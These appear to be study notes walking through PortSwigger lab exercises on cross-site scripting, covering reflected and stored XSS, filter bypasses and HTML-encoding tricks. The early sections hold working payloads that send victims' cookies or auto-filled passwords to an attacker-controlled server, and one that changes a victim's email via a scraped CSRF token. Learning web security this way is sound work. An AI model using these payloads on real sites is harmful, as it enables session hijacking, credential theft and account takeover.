Cross-site scripting cheat sheet:
```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
```

### General tip:
Sometimes these may work **ONLY** if you URL encode the payload in burp

### XSS via req param:
Suppose a website has a search function which receives the user-supplied search term in a URL parameter:
```
https://insecure-website.com/search?term=gift
```
The application echoes the supplied search term in the response to this URL:
```
<p>You searched for: gift</p>
```
Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this:
```
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```
This URL results in the following response:
```
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```

### Exploiting cross-site scripting to steal cookies
You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.

First solution (make user to make a req to your own server, either by making him click on some link on by storing script in the database and then all the users will see this on the html page):
```bash
<script>
fetch('https://your-own-server.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

Second solution (create a public blog comment with their cookie)
```bash
<script>
    let postId = 1
    fetch(`/post?postId=${postId}`)
    .then((res) => {
        return res.text()
    })
    .then((res2) => {
        const csrfLength = 32;
        const pattern = '<input required type="hidden" name="csrf" value="';
        const indexStart = res2.lastIndexOf(pattern);

        const start = indexStart + pattern.length
        const end = start + csrfLength
        const csrf = res2.slice(start, end)

        fetch('/post/comment', {
            method: "POST",
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `csrf=${csrf}&postId=${postId}&name=ffffffff&comment=${document.cookie}&email=ff%40ff.com&website=http%3A%2F%2Fasdfsdaf.com`
        })
    })
</script>
```

### Exploiting cross-site scripting to capture passwords
Many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password.

The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill. (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same.) 

### (Lab): Exploiting cross-site scripting to capture passwords
First solution: Paste the following payload into a text input field, e.g. website has a `post comment input field` (stored xss)
This will make other users send `username:pass` to your own server:
```bash
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

Second solution. Make users post submit their `username:pass` to the server db (e.g. by making them submit a comment)
```bash
<input type="text" name="username">
<input type="password" name="password" onchange="dothis()">

<script>
    function dothis() {
    const username = document.getElementsByName('username')[0].value
    const password = document.getElementsByName('password')[0].value
    const token = document.getElementsByName('csrf')[0].value
    const data = new FormData();

    data.append('csrf', token);
    data.append('postId', 6);
    data.append('comment', `${username}:${password}`);
    data.append('name', 'victim');
    data.append('email', 'blah@email.com');
    data.append('website', 'http://blah.com');

    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
    };
</script>
```

### Exploiting cross-site scripting to perform CSRF
Some websites allow logged-in users to change their email address without re-entering their password. If you've found an XSS vulnerability, you can make it trigger this functionality to change the victim's email address to one that you control, and then trigger a password reset to gain access to the account. 

Submit e.g. a comment with the following payload.
(This will make anyone who views the comment issue a POST request to change their email address to test@test.com)
```bash
<script>
fetch('/my-account')
.then((res) => {
	return res.text()
})
.then((res2) => {
	const csrfLength = 32;
	const pattern = '<input required type="hidden" name="csrf" value="';
    const indexStart = res2.indexOf(pattern);

	const start = indexStart + pattern.length
	const end = start + csrfLength
	const csrf = res2.slice(start, end)

	fetch('/my-account/change-email', {
		method: "POST",
		headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
		body: `email=fff%40aba333.com&csrf=${csrf}`
	})
})
</script>
```

### Lab: Reflected XSS into HTML context with most tags and attributes blocked
This lab contains a reflected XSS vulnerability in the **search functionality** but uses a web application firewall (WAF) to protect against common XSS vectors.

For a successful XSS attack we need to figure out:
- which html tags are blocked by firewall
- which events are blocked by firewall
To find that out, we can either use Burp Intruder or `bf` script written in go (in this xss folder)

There's a great step by step explanation of how to search for vulnerabilities in the Lab's `Solution`:

1. Inject a standard XSS vector, such as:
```
<img src=1 onerror=print()>
```
2. Observe that this gets blocked. In the next few steps, we'll use Burp Intruder to test which tags and attributes are being blocked.
3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
4. In Burp Intruder, in the Positions tab, replace the value of the search term with: `<>`
5. Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<§§>`
6. Visit the XSS cheat sheet and click "Copy tags to clipboard".
7. In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
8. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the body payload, which caused a 200 response.
9. Go back to the Positions tab in Burp Intruder and replace your search term with:
```
<body%20=1>
```
10. Place the cursor before the = character and click "Add §" twice, to create a payload position. The value of the search term should now look like: <body%20§§=1>
11. Visit the XSS cheat sheet and click "copy events to clipboard".
12. In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
13. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `onresize` payload, which caused a 200 response.
14. Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:
```bash
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
(which is: `?search="><body onresize=print()>"`)
15. Click "Store" and "Deliver exploit to victim".


### Lab: Reflected XSS into HTML context with all tags blocked except custom ones
This lab blocks all HTML tags except custom ones.

Make victim visit your site and your site should contain:
```bash
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
(which is: `?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x`)

This injection creates a custom tag with the name `xss` (but the name can be anything like: `random-tag`) with the ID of `x`, which contains an `onfocus` event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.
Note: we need a `tabindex=1` here because that's what allows this new custom html element (`xss`) to be focusable. 


### EXPERT Lab: Reflected XSS with event handlers and href attributes blocked
There's a search field that can be abused for xss. When we type `<h1>` we get a response that it's blocked. But `<a>` tag is not blocked. Only `href` on `<a>` is blocked.

We first figure out what is not blocked by firewall either with burp intruder or with `bf` golang script in this folder.
The brute force shows that `<animate>` tag is allowed. `<animate>` goes only with `<svg>` which means that `<svg>` is probably allowed as well.

`<svg>` allows us embedding other elements inside of it. If we want to include text inside of svg we have to use `<text>` element. We can also surround that text with an `<a>` tag, to make it clickable.
```
<svg><a><text>Click me</text></a>
```
x and y attributes on `<text`> specify the size of the `<text`> element.
```
<svg><a><text x=20 y=20>Click me</text></a>
```
The MDN tells: The SVG `<animate`> element provides a way to animate an attribute of an element over time.
Here's the example from the documentation:
```
<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
  <rect width="10" height="10">
    <animate
      attributeName="rx"
      values="0;5;0"
      dur="10s"
      repeatCount="indefinite" />
  </rect>
</svg>
```
`<animate>` will actually set an attribute on the parent html element in the case of the example above it'll set `<rx>` attribute with values `0;5;0` on the parent `<rect>` element.

So here's what we had:
```
<svg><a><text x=20 y=20>Click me</text></a>
```
And now since `href` is blocked on `<a>` element (e.g.: `<a href="">`) we can use `<animate>` which will set `href` for the parent element (which is `<a>` in the case below):
```
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

The same but url encoded:
```
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```

### Lab: Reflected XSS with some SVG markup allowed
First brute force for allowed html tags
We see that `<svg>` and `<animatetransform>` are allowed
We then brute force for allowed events:
We find that `onbegin` event is allowed, which specifies `js` code to be executed at the beginning of the animation
Therefore the solution is:
```
/?search=<svg><animatetransform onbegin=alert(1)>
```
or url encoded:
```
/?search=%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```

### XSS in HTML tag attributes
When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:
```
"><script>alert(document.domain)</script>
```
More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example: 
```
" autofocus onfocus=alert(document.domain) x="
```
The above payload creates an `onfocus` event that will execute JavaScript when the element receives the focus, and also adds the `autofocus` attribute to try to trigger the `onfocus` event automatically without any user interaction. Finally, it adds `x="` to gracefully repair the following markup. 

### Lab: Reflected XSS into attribute with angle brackets HTML-encoded
We had an html tag:
```bash
<input type="text" placeholder="Search the blog..." name="search" value="">
```
`value` attribute equals to whatever we put inside of that input html element
Therefore if we put the following into the input element:
```
" onmouseover='alert(33)'
```
then we'll get:
```bash
<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(33)" "="">
```
And it'll be reflected in url, so if user clicks on url and hovers a mouse over that input - then alert will be triggered

### Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded
This is a very simple stored XSS attack.

Our website stores a url that we provide in the input field in the database.
Later when this link is fetched to the frontend - the link is populated inside of an `<a>` element:
```bash
<a href="http://my-website.com">
```
What we can do is: we can provide a `javascript:alert(document.domain)` instead of `http` address and when user clicks on that link, the js code will be executed.
```bash
<a href="javascript:alert(document.domain)">
```

### Lab: Reflected XSS in canonical link tag
The page has:
```
<head>
  <link rel="canonical" href='https://0a970082045d0c3f83856454006800af.web-security-academy.net'/>
<head>
<body>
</body>
```
The value inside of `href` is going to be the same as the value in the url bar.
This means that we can change the url bar to the following:
```
https://fff.web-security-academy.net/?%27onclick=%27alert(33)
```

which will change the `<link>` tag that we'll get back from the server response:
```
<link rel="canonical" href='https://fff.web-security-academy.net/?'onclick='alert(33)'/>
```

There's a thing called `accesskey` which is a way of accessing a certain html element with a keyboard. So we can add both `accesskey` and `onclick` to the `<link>` tag and later if user presses that `accesskey` which in our case is the letter `x` then the `onclick` event is fired.
So we need to change the url in the browser in the following way:
```
https://fff.web-security-academy.net/?'accesskey='x'onclick='alert(33)
```
which will be reflected in the browser in the `<link>` tag:
```
<link rel="canonical" href='https://fff.web-security-academy.net/?'onclick='alert(33)'/>
```

### XSS into JavaScript, Terminating the existing script
### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
There's an input field for a search on the website. Whatever we put in is reflected inside of a javascript string, e.g. if we put `hello333` into the search input:
`<input value="hello333">`
it will be reflected inside of a js variable:
```
<script>
...
var searchTerms = 'hello333'
...
</script>
```
Therefore inside the search input we can try to write `' + alert()` but we see that single quotes are escaped with a backslash `var searchTerms = "\' hello333"`

We then can try to escape the backslash with a backslash: `\' + alert()` but unfortunately the backslashes are also escaped properly

We can then try to close the `<script>` tag before the place where it really ends.: `</script><script>alert(33)</script>`

In other words this is what was before our injection:
```
<script>
...
var searchTerms = 'hello333'
...
</script>
```
And after in the search input we put `hello333</script><script>alert(33)</script>` then we get:
```
<script>
...
var searchTerms = 'hello333</script>
<script>alert(33)</script>
'
...
</script>
```

The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script (`<script>alert(33)</script>`) being parsed and executed in the normal way
(BTW that closing single quote will be put inside of the HTML context and will be displayed on the page)

### Breaking out of a JavaScript string
### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
Both these labs are solved in the same way but the first lab is a bit simpler.

We've got a search input and it's value is reflected inside a js variable.
So if we put `<input value="hello333">`
It'll be reflected in: `var ff = 'hello333'`
We want to get out of that js string and execute our script, so we can try:
`<input value="hello333' + alert()">`
but in js `+` means concatination, therefore we use `-` 
`<input value="hello333' - alert()">`
We see that it is being escaped:
`var ff = 'hello333\' - alert()'`
So we try to provide: 
`<input value="hello333\' - alert()">`
And we get:
`var ff = 'hello333\\' - alert()'`
It worked well but we still have this closing single quote after `alert()` which breaks our whole script
Therfore we add `//` which will comment out the rest of the js string and inside of our input we'll have:
`hello333\' - alert()//` (or the same in html style: `<input value="hello333\' - alert()//">`)
Which will result in:
```bash
<script>
...
var ff = 'hello333\\' - alert()//'
...
</script>
```

### EXPERT Lab: Reflected XSS in a JavaScript URL with some characters blocked
```
https://fff.web-security-academy.net/post?postId=2
```
Leads to a blog with id `2`
Inside the blog page we see:
```
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2'}).finally(_ => window.location = '/')">Back to Blog</a>
```
And `?postId=` from url is reflected inside the fetch. So we can check our url for xss
**Note we probably need to do all the stuff url-encoded, but for the sake of simplicity here we are not gonna url-encode stuff...**

We can use the following exploit to change fetch function:
```
https://ff.web-security-academy.net/post?postId=5&'},a=b=>{throw/**/onerror=alert,3333},toString=a,window+'',{c:'
```
As a result the fetch inside of `<a>` tag will be changed to the following:
```
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=5&'},a=b=>{throw/**/onerror=alert,1337},toString=a,window+'',{c:''}).finally(_=>window.location='/')">Back to Blog</a>
```

**Explanation**:
Let's start at the beginning:
if we write: `?postId=5'` or even `?postId=5'}` then we get an err from the server: invalid postId. That's why we use `&` as a separator for url params. It separates everything that follows after `&` from the `postId` value which is `5` in the example above.

Let's look again at a simplified payload in the url:
```
/post?postId=5&'},toString=alert,window+'',{c:'
```
After `&` sign we have `'}` this is needed because we want to close an options object that is passed to the fetch function as the second argument. Check out the fetch function before our injection:
```
fetch('/analytics', {method:'post',body:'/post?postId=5'}).finally(_=>window.location='/')
```
And after our simplified injection:
```
fetch('/analytics', {method:'post',body:'/post?postId=5&'},toString=alert,window+'',{c:''}).finally(_=>window.location='/')
```
Few things need to be considered here:
Javascript allows does not care about the amount of arguments that are passed to the function.
In other words if we have a function that accepts 2 params but we pass e.g. 5 arguments, js will not care:
```bash
function ff(a,b) { /* do stuff with a and b */ }
ff(1,2,3,4,5)
```
What's even funnier is that since it doesn't care about third, fourth and subsequent arguments, we can actually do assignments in the places where params should have been passed:
```bash
let bb = 33;
function ff(a,b) { /* do stuff with a and b */ }
ff(1,2,3,bb=100,5)
console.log(bb) // outputs 100
```
Let's look at our simplified injection again:
```
/post?postId=5&'},toString=alert,window+'',{c:'
```
We're trying to concatinate window object with an empty string: `window+''`
Under the hood it calls javascript's built in function `toString` to perfect that concatination.
But before we do `window+''` we actually override javascript's built in `toString` function with `alert` function.
This means that when js tries to concatinate window with an empty string, it will actually call `alert` function because we have overriden toString function.

As a last argument to the fetch function we pass: `,{c:'`. This is needed because we need a graceful closing. Without it we would be:
```
fetch('/analytics', {method:'post',body:'/post?postId=5&'},toString=alert,window+'''}).finally(_=>window.location='/')
```
`window+'''}` is happening because after `postId=5&` we injected `'}` so that we could close the second arguments that is passed to the fetch (second arguments is options object) and add more arguments.
But since we provided `{c:'` at the end of our payload, the fetch function call is gracefully closed:
```
fetch('/analytics', {method:'post',body:'/post?postId=5&'},toString=alert,window+'',{c:''}).finally(_=>window.location='/')
```

But what we did above will only call the alert function itself. But if we want to pass some arguments to it, then we need to create an arrow function `a=b=>{throw/**/onerror=alert,3333}`, which will be called during window concatination with a string.
```
?postId=5&'},a=b=>{throw/**/onerror=alert,3333},toString=a,window+'',{c:'
```
Spaces are not allowed so instead of a space we use `/**/` inside of `a=b=>{throw/**/onerror=alert,3333}`

`onerror` is a function that is called when js throws an err. That's actually what our function is doing. It throws an err and it passes the last argument of it's call to the `onerror` function. e.g.:
`throw 111` under the hood will call `onerror(111)`

What's  interesting is that `throw` will only pass the last argument to the `onerror` function.
In another words:
`throw 111, 222` under the hood will call `onerror(222)`

Since the first argument is ignored, we an actually use that argument to override `onerror` function with the `alert` function.

And later when `a=b=>{throw/**/onerror=alert,3333}` is called - then it'll be the same as `throw 3333` and since `onerror` is overriden with `alert`, it means that it'll pass `3333` to the `alert` function call : ))

BTW `b` param is ignored here, it is here because `()` are blocked by WAF.


### Making use of HTML-encoding
### Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
On the website we can add a new comment to a blog:
We specify: author name: `ff1` and author's website url `http://ff.com`. Later it is stored in db and returned from the server inside of `<a>` tag:
```
<a id="author" href="http://ff.com" onclick="var tracker={track(){}};tracker.track('http://ff.com');">ff1</a>
```
So we can try to break out of existing strings and inject our js payload, but read the lab title, it tells already what is not possible to do.
So, single quotes are escaped, but what if we try to HTML-encode single quotes?
`&apos;` is html-encoding for a single quote character.
Therefore we do the following:
```
http://bbb.com&apos;-alert(1)-&apos;
```
e.g. in .reqbody:
```
website=http://bbb.com%26apos%3b-alert(1)-%26apos%3b
```

As a result we were able to break out of the js string and we got: `track('http://bbb.com'-alert(1)-'');`

What's interesting is that from the server we got the following response: (when we press Ctrl+U we see a response from the server)
```bash
<a id="author" href="http://bbb.com&apos;-alert(1)-&apos;" onclick="var tracker={track(){}};tracker.track('http://bbb.com&apos;-alert(1)-&apos;');">vv2</a>
```

But if we inspect DOM element in the browser dev tools, we'll find:
```bash
<a id="author" href="http://bbb.com'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http://bbb.com'-alert(1)-'');">vv2</a>
```

This is because browser reads the response from the server and replaces `&apos;` with single quotes.

> Note: It's important to understand that this works because we have a javascript in HTML context, in this case it's inside of `onclick` event. That's why browser was able to replace 
`&apos;` with a single quote.
> Inside the `<script>` tag html encoded values will probably throw an err


### XSS in JavaScript template literals
### Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
Whatever we type in a search bar is reflected inside of a js template (starts and ends with a backticks) string.
We can simply inject: `${alert(1)}`

